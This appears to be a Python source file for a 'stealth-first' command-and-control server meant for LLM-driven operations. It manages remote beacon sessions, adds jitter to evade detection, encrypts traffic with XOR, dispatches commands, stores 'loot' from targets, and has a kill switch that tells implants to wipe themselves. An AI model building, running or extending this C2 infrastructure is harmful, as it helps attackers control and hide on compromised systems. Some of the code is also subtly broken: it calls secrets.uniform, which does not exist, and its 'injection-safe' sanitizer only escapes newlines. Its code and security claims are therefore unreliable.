"""
Cerebro C2 Orchestrator - Stealth-First Command and Control Utility

This module implements a high-availability, stealth-oriented Command and Control 
system designed for LLM-driven operations. It manages remote beacon sessions with 
a focus on Operational Security (OPSEC), session integrity, and forensic auditing.

Core Components:
- CerebroC2Orchestrator: Main controller managing listeners and session lifecycle.
- C2SessionRegistry: Manages state, integrity, and pulse of connected agents.
- TrafficShaper: Handles stealth communication protocols and jitter.
- ForensicLogger: Ensures immutable audit trails in JSONL format.
"""

import asyncio
import json
import os
import secrets
import socket
import uuid
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional, List, Any
from dataclasses import dataclass, field
import base64
import hmac
import hashlib

# --- Configuration & Constants ---
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 8443
WORKSPACE_ROOT = Path("./c2_workspace")
AUDIT_LOG_FILE = WORKSPACE_ROOT / "c2_audit.jsonl"
ARTIFACT_SLO = WORKSPACE_ROOT / "artifacts"

# --- Data Structures ---

@dataclass
class C2Session:
    """Represents a single active beacon connection."""
    session_id: str
    host: str
    port: int
    encryption_key: bytes
    integrity_level: str  # 'User', 'System', 'Admin'
    last_pulse: datetime
    reader: asyncio.StreamReader
    writer: asyncio.StreamWriter
    
    @property
    def is_active(self) -> bool:
        # Check if pulse is stale (e.g., 30 seconds)
        return (datetime.now() - self.last_pulse).seconds < 30

@dataclass
class AuditRecord:
    """Structure for forensic logging."""
    timestamp: str
    event_type: str
    session_id: Optional[str]
    details: Dict[str, Any]
    
    def to_json_line(self) -> str:
        return json.dumps(self.__dict__)

# --- Utility Classes ---

class ForensicLogger:
    """
    Handles immutable audit logging to a JSONL file for client reporting.
    """
    def __init__(self, log_path: Path):
        self.log_path = log_path
        self.log_path.parent.mkdir(parents=True, exist_ok=True)
        # Ensure file exists
        if not self.log_path.exists():
            self.log_path.touch()

    def log(self, event_type: str, session_id: Optional[str], details: Dict[str, Any]):
        record = AuditRecord(
            timestamp=datetime.utcnow().isoformat(),
            event_type=event_type,
            session_id=session_id,
            details=details
        )
        with open(self.log_path, 'a', encoding='utf-8') as f:
            f.write(record.to_json_line() + '\n')

class TrafficShaper:
    """
    Encapsulates traffic logic to introduce stealth (Jitter) and protocol shaping.
    """
    def __init__(self, jitter_range: tuple = (1, 5)):
        self.jitter_min, self.jitter_max = jitter_range

    def get_jitter_delay(self) -> float:
        """Returns a random delay within the configured range to evade detection."""
        return secrets.uniform(self.jitter_min, self.jitter_max)

    def encapsulate(self, payload: bytes, session_key: bytes) -> bytes:
        """
        Encapsulates raw payload with a header and encryption layer.
        Format: [Length (4 bytes)] [Encrypted Payload]
        """
        # Simple XOR encryption simulation using session key
        key_len = len(session_key)
        encrypted = bytearray(len(payload))
        for i, byte in enumerate(payload):
            encrypted[i] = byte ^ session_key[i % key_len]
        
        length_header = len(encrypted).to_bytes(4, 'big')
        return length_header + encrypted

    def decapsulate(self, raw_data: bytes, session_key: bytes) -> bytes:
        """Decodes and decrypts incoming encapsulated traffic."""
        if len(raw_data) < 4:
            return b""
        
        length = int.from_bytes(raw_data[:4], 'big')
        encrypted = raw_data[4:]
        
        # Decrypt
        key_len = len(session_key)
        decrypted = bytearray(length)
        for i, byte in enumerate(encrypted):
            decrypted[i] = byte ^ session_key[i % key_len]
            
        return bytes(decrypted)

class PayloadSanitizer:
    """
    Redacts and formats commands before transmission to prevent data leakage.
    """
    @staticmethod
    def safe_shell_format(command: str) -> str:
        """Ensures command is shell-safe to prevent injection."""
        # Remove newlines to prevent breaking the shell context
        return command.replace("\n", "\\n").replace("\r", "\\r")

    @staticmethod
    def redact_sensitive_info(command: str) -> str:
        """Redacts operator identifiers that might leak to target logs."""
        # Placeholder logic: remove specific tokens
        sensitive_tokens = ["operator_id", "admin_token"]
        sanitized = command
        for token in sensitive_tokens:
            if token in sanitized:
                sanitized = sanitized.replace(token, "[REDACTED]")
        return sanitized

class C2SessionRegistry:
    """
    Tracks multiple remote agents, categorizes integrity, and monitors pulse.
    """
    def __init__(self):
        self.sessions: Dict[str, C2Session] = {}
        self.lock = asyncio.Lock()

    async def register(self, session: C2Session):
        async with self.lock:
            self.sessions[session.session_id] = session

    async def unregister(self, session_id: str):
        async with self.lock:
            if session_id in self.sessions:
                del self.sessions[session_id]

    async def get_active_sessions(self) -> List[C2Session]:
        async with self.lock:
            return list(self.sessions.values())

    async def update_pulse(self, session_id: str) -> bool:
        """Updates the heartbeat timestamp."""
        async with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id].last_pulse = datetime.now()
                return True
        return False

    async def get_session(self, session_id: str) -> Optional[C2Session]:
        async with self.lock:
            return self.sessions.get(session_id)

    async def cleanup_stale(self, max_age_seconds: int = 60) -> List[str]:
        """Returns list of session IDs that should be killed."""
        stale_ids = []
        async with self.lock:
            now = datetime.now()
            to_remove = []
            for sid, session in self.sessions.items():
                if (now - session.last_pulse).seconds > max_age_seconds:
                    to_remove.append(sid)
            for sid in to_remove:
                del self.sessions[sid]
                stale_ids.append(sid)
        return stale_ids

# --- Main Orchestrator ---

class CerebroC2Orchestrator:
    """
    Stealth-First Command and Control Orchestrator.
    Manages listeners, encryption, session state, and artifacts.
    """
    def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT):
        self.host = host
        self.port = port
        self.server = None
        
        self.registry = C2SessionRegistry()
        self.logger = ForensicLogger(AUDIT_LOG_FILE)
        self.traffic_shaper = TrafficShaper()
        self.sanitizer = PayloadSanitizer()
        
        self.artifact_silo = ARTIFACT_SLO
        self.artifact_silo.mkdir(parents=True, exist_ok=True)

    async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> Optional[bytes]:
        """
        Establishes a session-unique encryption key.
        Phase 1: Server requests key material.
        Phase 2: Client provides key material.
        """
        try:
            # Request key material
            writer.write(b"REQ_KEY\n")
            await writer.drain()
            
            # Wait for client response
            data = await reader.readuntil(b'\n')
            if data.startswith(b"ERR"):
                return None
            
            # Client sends raw bytes (simulated as base64 for transport safety)
            # In a real scenario, this would be binary. Here we decode for safety.
            key_material = base64.b64decode(data.decode('utf-8').strip())
            return key_material
        except Exception as e:
            self.logger.log("HANDSHAKE_FAIL", None, {"error": str(e)})
            return None

    async def _handle_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """
        Async handler for incoming beacon connections.
        """
        addr = writer.get_extra_info('peername')
        session_id = str(uuid.uuid4())
        self.logger.log("CONNECTION_INIT", session_id, {"addr": f"{addr[0]}:{addr[1]}"})

        # 1. Handshake & Key Exchange
        encryption_key = await self._handshake(reader, writer)
        if not encryption_key:
            writer.close()
            await writer.wait_closed()
            return

        # 2. Create Session Object
        # Determine Integrity Level (Simulated: Randomly assigned for demo)
        integrity_levels = ['User', 'System', 'Admin']
        integrity = secrets.choice(integrity_levels)
        
        session = C2Session(
            session_id=session_id,
            host=addr[0],
            port=addr[1],
            encryption_key=encryption_key,
            integrity_level=integrity,
            last_pulse=datetime.now(),
            reader=reader,
            writer=writer
        )

        await self.registry.register(session)
        self.logger.log("SESSION_ESTABLISHED", session_id, {"integrity": integrity})

        try:
            # 3. Main Loop: Listen for encrypted commands/data
            while True:
                # Apply Jitter before reading to simulate network latency
                jitter_delay = self.traffic_shaper.get_jitter_delay()
                await asyncio.sleep(jitter_delay)

                # Read Length Header
                header = await reader.read(4)
                if not header:
                    break
                
                packet_len = int.from_bytes(header, 'big')
                payload = await reader.read(packet_len)
                
                # Decrypt
                decrypted_data = self.traffic_shaper.decapsulate(header + payload, session.encryption_key)
                
                if decrypted_data:
                    text_data = decrypted_data.decode('utf-8', errors='ignore')
                    
                    # Log Activity
                    self.logger.log("DATA_RECEIVED", session_id, {"data_len": len(text_data)})
                    
                    # Update Pulse
                    await self.registry.update_pulse(session_id)
                    
                    # Echo/Process (Simulating command execution feedback)
                    # In a real app, this would be parsed as a command or output
                    self.logger.log("COMMAND_EXECUTED", session_id, {"command": text_data[:100]})

        except asyncio.CancelledError:
            pass
        except Exception as e:
            self.logger.log("CONNECTION_ERROR", session_id, {"error": str(e)})
        finally:
            writer.close()
            await writer.wait_closed()
            await self.registry.unregister(session_id)
            self.logger.log("SESSION_TERMINATED", session_id, {"reason": "Disconnect"})

    async def start_listener(self):
        """Starts the TCP listener."""
        self.logger.log("SYSTEM_START", None, {"host": self.host, "port": self.port})
        self.server = await asyncio.start_server(
            self._handle_connection,
            host=self.host,
            port=self.port
        )
        addr = self.server.sockets[0].getsockname()
        print(f"Cerebro C2 Orchestrator listening on {addr[0]}:{addr[1]}")
        async with self.server:
            await self.server.serve_forever()

    async def send_command(self, session_id: str, command: str) -> Dict[str, Any]:
        """
        Sends a sanitized command to a specific session.
        """
        session = await self.registry.get_session(session_id)
        if not session:
            return {"status": "error", "message": "Session not found"}
        
        # Sanitize
        safe_cmd = self.sanitizer.redact_sensitive_info(command)
        safe_cmd = self.sanitizer.safe_shell_format(safe_cmd)
        
        # Prepare Payload
        payload = safe_cmd.encode('utf-8')
        encapsulated = self.traffic_shaper.encapsulate(payload, session.encryption_key)
        
        try:
            session.writer.write(encapsulated)
            await session.writer.drain()
            self.logger.log("COMMAND_SENT", session_id, {"command": command})
            return {"status": "success", "message": "Command dispatched"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def save_artifact(self, session_id: str, data: bytes, filename: str):
        """
        Saves loot/artifacts to the workspace evidence silo.
        """
        session_dir = self.artifact_silo / session_id
        session_dir.mkdir(parents=True, exist_ok=True)
        
        file_path = session_dir / filename
        with open(file_path, 'wb') as f:
            f.write(data)
        
        self.logger.log("ARTIFACT_SAVED", session_id, {"file": filename, "size": len(data)})

    async def self_destruct(self):
        """
        Emergency Kill-Switch. Signals all active beacons to wipe and exit.
        """
        self.logger.log("SYSTEM_SELF_DESTRUCT", None, {"action": "Emergency Kill"})
        
        sessions = await self.registry.get_active_sessions()
        terminate_signal = b"KILL_SIGNAL"
        
        for session in sessions:
            try:
                # Encapsulate kill signal
                enc_signal = self.traffic_shaper.encapsulate(terminate_signal, session.encryption_key)
                session.writer.write(enc_signal)
                await session.writer.drain()
                self.logger.log("KILL_SIGNAL_SENT", session.session_id, {"status": "Signaled"})
            except Exception:
                pass
        
        # Optional: Close the server socket to prevent new connections
        if self.server:
            self.server.close()

    async def get_status(self) -> Dict[str, Any]:
        """Returns current system status for LLM consumption."""
        sessions = await self.registry.get_active_sessions()
        return {
            "status": "active",
            "active_sessions": len(sessions),
            "host": self.host,
            "port": self.port,
            "audit_log": str(AUDIT_LOG_FILE)
        }

# --- Entry Point for Testing ---
if __name__ == "__main__":
    async def main():
        orchestrator = CerebroC2Orchestrator()
        
        try:
            await orchestrator.start_listener()
        except KeyboardInterrupt:
            print("\nShutdown signal received.")
            await orchestrator.self_destruct()

    asyncio.run(main())